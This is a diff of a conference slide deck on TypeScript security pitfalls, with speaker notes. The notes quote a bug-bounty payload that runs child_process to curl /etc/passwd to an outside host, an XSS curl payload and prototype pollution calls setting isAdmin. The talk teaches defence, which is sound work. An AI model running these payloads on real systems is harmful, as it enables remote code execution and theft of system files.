@@ -255,13 +255,17 @@ Can you spot the issue?
 
 ---
 
-# A "silly vulnerability" that paid $10k in bug bounty
-
-### (that's $10,000 for a string of text 😉)
+# A vulnerability report that paid $10k in bug bounty
 
 ![dustjs-linkedin bug bounty demo](./images/dustjs-linkedin-bug-bounty-demo.png)
 
-<!-- can finish the presentation with the string payload to keep the dramatic effect:
+<!-- 
+
+"just a small typing issue"
+
+that's pocketing a pay-out of $10,000 for a string of text 😉
+
+can finish the presentation with the string payload to keep the dramatic effect:
 https://_demo.paypal.com/demo/navigation?device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')-'
 -->
 
@@ -1004,7 +1008,9 @@ layout: cover
 
 reminder: type juggling
 
-```sh {0-5|6}
+<div v-click>
+
+```sh {0-5|6}{at:2}
 $ curl -G -X 'GET' 
   -H 'accept: application/json'
   "http://localhost:8080/users/component"
@@ -1013,7 +1019,13 @@ $ curl -G -X 'GET'
 <h1>Hello, <img src=x onError=alert(1) />!</h1>
 ```
 
+</div v-click>
+
+<div v-click at="3">
 Congrats, you're a hacker! 👏
+</div>
+
+
 
 ---
 layout: side-title
@@ -1035,6 +1047,8 @@ align: rm-lm
 - ❌ Do not rely on TypeScript alone for Type security
 
 <!--
+__ TypeScript security fallacies __
+
 So let's take a second to reflect on some of the TypeScript security fallacies we've learned so far.
 
  Last bullet, emphasize:
@@ -1051,6 +1065,9 @@ layout: cover
 <Tweet id="1883897466019590307"/>
 
 <!--
+
+  This tweet demonstrates why having an adversarial mindset that TypeScript type system is not a security tool is so important
+
   Developers put misplaced trust in TypeScript and exchange runtime security for test cases
 -->
 
@@ -1083,6 +1100,14 @@ if (typeof filterQuery !== "string") {
 - 👎 Con: not all type guards are created equal (e.g: typeof `null` is `object` 😅)
 
 </v-click>
+
+<!--
+
+TypeScript Security Best Practice #1
+
+and why it's not perfect...
+
+-->
 
 ---
 layout: side-title
@@ -1396,7 +1421,7 @@ color: blue-light
 
 #### 1. Incoming HTTP Request
 
-```sh {all|2-4}
+```sh {2-4}
 $ curl -X POST -H 'Content-Type: application/json' http://localhost:8080/users/1/profile  -d '{
      "name": "Liran",
      "email": "liran@example.com",
@@ -1552,15 +1577,6 @@ $ curl -X POST -H 'Content-Type: application/json' http://localhost:8080/users/1
 
 ---
 layout: default
-color: purple-light
----
-
-### TypeScript Security Learnings 🧑‍🎓
-
-<Bluesky class="mt-16" id="at://did:plc:b3xwbnwkl5qzjjhkwoimvb6x/app.bsky.feed.post/3lfwiv5x46k2a" />
-
----
-layout: default
 color: blue-light
 ---
 
@@ -1606,6 +1622,11 @@ if (options.includeInheritedProps && (currentPath === '__proto__' ||
 ```
 
 <!--
+
+- downloaded about 8 million times a MONTH
+
+- all last 3 versions were security fixes
+
   Story reference: https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/
 -->
 
@@ -1628,7 +1649,7 @@ align: l
 objectPath.withInheritedProps.set({}, '__proto__', 'isAdmin', true);
 ```
 ```js
-objectPath.withInheritedProps.set({}, [['__proto__'], 'polluted'], 'yes');
+objectPath.withInheritedProps.set({}, [['__proto__'], 'isAdmin'], true);
 ```
 ````
 
@@ -1673,7 +1694,6 @@ align: l
 ### ℹ Standard use-case
 
 ```js
-// curl -i -X GET "https://localhost:3000/test?name[]=%3Cimg%20src=x%20onerror=%27alert(1)%27%20/%3E"
 app.get('/home', (req, res) => {
     const html = edge.render('welcome', { greeting: req.query.name })
     return res.send(html)
@@ -1695,6 +1715,10 @@ public escape<T>(input: T): T extends SafeValue ? T['value'] : T {
 ```
 
 <!--
+
+  example exploit payload:
+  // curl -i -X GET "https://localhost:3000/test?name[]=%3Cimg%20src=x%20onerror=%27alert(1)%27%20/%3E"
+
   Story reference: https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/
 -->
 
@@ -1766,7 +1790,7 @@ color: purple-light
 ---
 layout: credits
 color: light
-speed: 0.3
+speed: 0.5
 ---
 
 <div class="grid text-size-4 grid-cols-3 w-3/4 gap-y-10 auto-rows-min ml-auto mr-auto">
@@ -1780,15 +1804,13 @@ speed: 0.3
 </div>
 <div class="grid-item text-right mr-4 col-span-1"><strong>Event</strong></div>
 <div class="grid-item col-span-2">
-  Conference <i>The organizer crew</i>&nbsp;<mdi-open-in-new class="font-size-3 mb-0.5" />
+  Voxxed Days Bucharest 2025 <i>as The organizer crew</i>&nbsp;<mdi-open-in-new class="font-size-3 mb-0.5" />
   <br/>
   You wonderful people <i>as the "Audience"</i>&nbsp;<mdi-open-in-new class="font-size-3 mb-0.5" /></div>
 <div class="grid-item text-right mr-4 col-span-1"><strong>Slides</strong></div>
 <div class="grid-item col-span-2">
 Slidev<br/>
 Vue.js<br/>
-Liran Tal<br/>
-Snyk<br/>
 Pavel Romanov<br/>
 Karl Horky<br/>
 Wesley Todd<br/>
